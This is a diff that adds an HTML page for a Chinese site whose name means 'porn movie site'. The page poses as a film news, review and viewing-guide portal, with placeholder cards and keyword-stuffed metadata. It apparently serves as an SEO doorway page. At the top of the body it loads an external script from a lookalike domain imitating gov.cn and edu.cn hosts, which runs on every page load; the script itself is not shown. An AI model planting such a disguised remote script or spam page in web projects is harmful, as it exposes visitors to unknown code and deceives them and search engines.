@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>黄色电影网 - 电影资讯、影评与观影指南</title>
+<meta name="description" content="黄色电影网分享最新电影资讯、深度影评、高分片单与观影指南，帮助影迷发现好电影。">
+<meta name="keywords" content="黄色电影网, 电影资讯, 影评, 观影指南, 高分电影">
+<link rel="canonical" href="https://huangsedianyingwang-top.github.io/">
+<style>
+  :root{--main:#e63950;--dark:#14141f;--gray:#666;--bg:#f6f6f8;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:#222;line-height:1.7;}
+  a{color:inherit;text-decoration:none;}
+  img{max-width:100%;display:block;}
+  .wrap{max-width:1100px;margin:0 auto;padding:0 16px;}
+
+  /* Header */
+  header{background:var(--dark);position:sticky;top:0;z-index:99;}
+  .nav{display:flex;align-items:center;justify-content:space-between;height:56px;}
+  .logo{color:#fff;font-size:20px;font-weight:800;letter-spacing:1px;}
+  .logo span{color:var(--main);}
+  .menu-btn{display:none;background:none;border:0;color:#fff;font-size:26px;cursor:pointer;}
+  nav ul{display:flex;gap:24px;list-style:none;}
+  nav a{color:#ddd;font-size:15px;transition:.2s;}
+  nav a:hover{color:var(--main);}
+
+  /* Hero */
+  .hero{background:linear-gradient(135deg,#1b1b2a,#2a1b2a);color:#fff;padding:60px 0;text-align:center;}
+  .hero h1{font-size:34px;margin-bottom:12px;}
+  .hero h1 em{color:var(--main);font-style:normal;}
+  .hero p{color:#ccc;max-width:640px;margin:0 auto 24px;}
+  .btn{display:inline-block;background:var(--main);color:#fff;padding:12px 30px;border-radius:30px;font-weight:600;}
+
+  /* Section */
+  section{padding:50px 0;}
+  .sec-title{font-size:24px;margin-bottom:6px;}
+  .sec-sub{color:var(--gray);margin-bottom:28px;}
+  .grid{display:grid;gap:20px;}
+  .g4{grid-template-columns:repeat(4,1fr);}
+  .g3{grid-template-columns:repeat(3,1fr);}
+  .g2{grid-template-columns:repeat(2,1fr);}
+
+  .card{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.06);transition:.25s;}
+  .card:hover{transform:translateY(-6px);box-shadow:0 10px 26px rgba(0,0,0,.12);}
+  .card .thumb{height:150px;background:linear-gradient(120deg,#ff7a7a,#e63950);}
+  .card .pad{padding:16px;}
+  .card h3{font-size:17px;margin-bottom:6px;}
+  .card p{font-size:14px;color:var(--gray);}
+  .tag{display:inline-block;background:#fdeaec;color:var(--main);font-size:12px;padding:3px 10px;border-radius:20px;margin-bottom:8px;}
+
+  .list-item{background:#fff;border-radius:12px;padding:18px;margin-bottom:14px;box-shadow:0 2px 10px rgba(0,0,0,.05);}
+  .list-item h3{color:var(--main);}
+
+  footer{background:var(--dark);color:#aaa;padding:34px 0;text-align:center;font-size:13px;}
+  footer a{color:#ccc;}
+
+  /* Mobile */
+  @media(max-width:820px){
+    .menu-btn{display:block;}
+    nav ul{display:none;position:absolute;top:56px;left:0;right:0;background:var(--dark);flex-direction:column;padding:16px;text-align:center;gap:14px;}
+    nav ul.open{display:flex;}
+    .hero{padding:42px 0;}
+    .hero h1{font-size:26px;}
+    .g4,.g3,.g2{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <div class="logo">黄色<span>电影网</span></div>
+    <button class="menu-btn" onclick="document.getElementById('navlist').classList.toggle('open')">☰</button>
+    <nav>
+      <ul id="navlist">
+        <li><a href="#news">电影资讯</a></li>
+        <li><a href="#review">深度影评</a></li>
+        <li><a href="#list">高分片单</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="wrap">
+    <h1>欢迎来到 <em>黄色电影网</em></h1>
+    <p>专注电影资讯、深度影评与观影指南，陪你发现每一部值得一看的好电影。</p>
+    <a class="btn" href="#review">立即探索</a>
+  </div>
+</div>
+
+<section id="news">
+  <div class="wrap">
+    <h2 class="sec-title">电影资讯</h2>
+    <p class="sec-sub">最新上映动态与行业观察</p>
+    <div class="grid g3">
+      <div class="card"><div class="thumb"></div><div class="pad"><span class="tag">热映</span><h3>本周院线新片盘点</h3><p>黄色电影网为你梳理本周值得关注的院线新作。</p></div></div>
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#6a82fb,#fc5c7d)"></div><div class="pad"><span class="tag">预告</span><h3>下月待映片单</h3><p>提前锁定下月不容错过的精彩影片。</p></div></div>
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#f7971e,#ffd200)"></div><div class="pad"><span class="tag">行业</span><h3>电影市场观察</h3><p>解读票房趋势与观众口味变化。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="review" style="background:#fff;">
+  <div class="wrap">
+    <h2 class="sec-title">深度影评</h2>
+    <p class="sec-sub">不止于剧透，更在于理解</p>
+    <div class="grid g2">
+      <div class="list-item"><span class="tag">长评</span><h3>《影片名》：一场关于选择的叙事实验</h3><p>从镜头语言到人物弧光，聊聊这部作品的真正看点。</p></div>
+      <div class="list-item"><span class="tag">短评</span><h3>为什么这部冷门片值得被看见</h3><p>小成本如何靠剧本与表演打动观众。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="list">
+  <div class="wrap">
+    <h2 class="sec-title">高分片单</h2>
+    <p class="sec-sub">精选不同主题的好片合集</p>
+    <div class="grid g4">
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#43cea2,#185a9d)"></div><div class="pad"><h3>治愈系推荐</h3><p>适合周末一个人静静看的片子。</p></div></div>
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#ee0979,#ff6a00)"></div><div class="pad"><h3>悬疑烧脑</h3><p>反转不断的类型片精选。</p></div></div>
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#8e2de2,#4a00e0)"></div><div class="pad"><h3>经典重映</h3><p>值得在大银幕重温的老片。</p></div></div>
+      <div class="card"><div class="thumb" style="background:linear-gradient(120deg,#11998e,#38ef7d)"></div><div class="pad"><h3>纪录片精选</h3><p>真实自有万钧之力。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="guide" style="background:#fff;">
+  <div class="wrap">
+    <h2 class="sec-title">观影指南</h2>
+    <p class="sec-sub">让每一次观影都更尽兴</p>
+    <div class="grid g3">
+      <div class="list-item"><h3>如何挑选适合自己的电影</h3><p>类型、评分、口碑怎么看才不被剧透。</p></div>
+      <div class="list-item"><h3>家庭观影选片建议</h3><p>不同年龄层观众的合家欢之选。</p></div>
+      <div class="list-item"><h3>IMAX 与杜比影院怎么选</h3><p>不同格式适合什么样的影片。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <h2 class="sec-title">关于 黄色电影网</h2>
+    <p class="sec-sub">一个由影迷为影迷打造的分享平台</p>
+    <div class="list-item" style="text-align:center;"><p>本站提供电影资讯、影评与观影指南等原创内容，倡导通过正规渠道观看影视作品，尊重创作者与版权。</p></div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p>© 2026 黄色电影网 · 电影资讯 · 影评 · 观影指南　|　<a href="#about">关于我们</a>　<a href="#">免责声明</a></p>
+    <p style="margin-top:8px;">请通过正规授权平台观看影视内容，支持正版。</p>
+  </div>
+</footer>
+
+</body>
+</html>
